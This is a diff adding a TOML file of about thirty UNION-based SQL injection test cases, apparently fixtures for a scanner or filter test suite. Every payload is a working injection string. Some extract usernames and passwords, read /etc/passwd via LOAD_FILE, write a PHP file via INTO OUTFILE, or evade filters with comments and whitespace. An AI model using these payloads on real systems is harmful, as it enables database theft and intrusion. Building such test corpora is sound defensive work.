@@ -1,0 +1,152 @@
+schema = 1
+# UNION-based SQLi: leak data by appending UNION SELECT.
+
+[[case]]
+id = "union_select_null_3"
+class = "sql"
+payload = "' UNION SELECT NULL,NULL,NULL--"
+
+[[case]]
+id = "union_select_null_1"
+class = "sql"
+payload = "' UNION SELECT NULL--"
+
+[[case]]
+id = "union_select_null_5"
+class = "sql"
+payload = "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+
+[[case]]
+id = "union_all_select_null"
+class = "sql"
+payload = "' UNION ALL SELECT NULL,NULL--"
+
+[[case]]
+id = "union_select_int"
+class = "sql"
+payload = "' UNION SELECT 1,2,3--"
+
+[[case]]
+id = "union_select_str"
+class = "sql"
+payload = "' UNION SELECT 'a','b','c'--"
+
+[[case]]
+id = "union_select_version"
+class = "sql"
+payload = "' UNION SELECT @@version,NULL--"
+
+[[case]]
+id = "union_select_db_user"
+class = "sql"
+payload = "' UNION SELECT user(),database()--"
+
+[[case]]
+id = "union_select_information_schema"
+class = "sql"
+payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+
+[[case]]
+id = "union_select_columns"
+class = "sql"
+payload = "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+
+[[case]]
+id = "union_select_concat"
+class = "sql"
+payload = "' UNION SELECT CONCAT(username,0x3a,password) FROM users--"
+
+[[case]]
+id = "union_select_group_concat"
+class = "sql"
+payload = "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"
+
+[[case]]
+id = "union_select_pg_user"
+class = "sql"
+payload = "' UNION SELECT current_user,version()--"
+
+[[case]]
+id = "union_select_mssql_user"
+class = "sql"
+payload = "' UNION SELECT system_user,@@version--"
+
+[[case]]
+id = "union_select_oracle_dual"
+class = "sql"
+payload = "' UNION SELECT banner,NULL FROM v$version--"
+
+[[case]]
+id = "union_distinct"
+class = "sql"
+payload = "' UNION DISTINCT SELECT NULL,NULL--"
+
+[[case]]
+id = "union_select_padded"
+class = "sql"
+payload = "'/**/UNION/**/SELECT/**/NULL,NULL--"
+
+[[case]]
+id = "union_select_newline"
+class = "sql"
+payload = "'\nUNION\nSELECT\nNULL,NULL--"
+
+[[case]]
+id = "union_select_tab"
+class = "sql"
+payload = "'\tUNION\tSELECT\tNULL,NULL--"
+
+[[case]]
+id = "union_versioned_comment"
+class = "sql"
+payload = "'/*!50000UNION*/ SELECT NULL,NULL--"
+
+[[case]]
+id = "union_subquery"
+class = "sql"
+payload = "' UNION SELECT (SELECT password FROM users LIMIT 1),NULL--"
+
+[[case]]
+id = "union_with_order_by"
+class = "sql"
+payload = "' ORDER BY 3-- UNION SELECT NULL,NULL,NULL--"
+
+[[case]]
+id = "union_load_file"
+class = "sql"
+payload = "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--"
+
+[[case]]
+id = "union_outfile"
+class = "sql"
+payload = "' UNION SELECT 'shell',NULL INTO OUTFILE '/tmp/x.php'--"
+
+[[case]]
+id = "union_extractvalue"
+class = "sql"
+payload = "' UNION SELECT EXTRACTVALUE(1,'/x'),NULL--"
+
+[[case]]
+id = "union_select_hex"
+class = "sql"
+payload = "' UNION SELECT HEX(version()),NULL--"
+
+[[case]]
+id = "union_select_unhex"
+class = "sql"
+payload = "' UNION SELECT UNHEX('616263'),NULL--"
+
+[[case]]
+id = "union_select_null_alias"
+class = "sql"
+payload = "' UNION SELECT NULL AS x,NULL AS y--"
+
+[[case]]
+id = "union_with_limit"
+class = "sql"
+payload = "' UNION SELECT NULL,NULL LIMIT 1 OFFSET 0--"
+
+[[case]]
+id = "union_paren"
+class = "sql"
+payload = "') UNION SELECT NULL,NULL--"
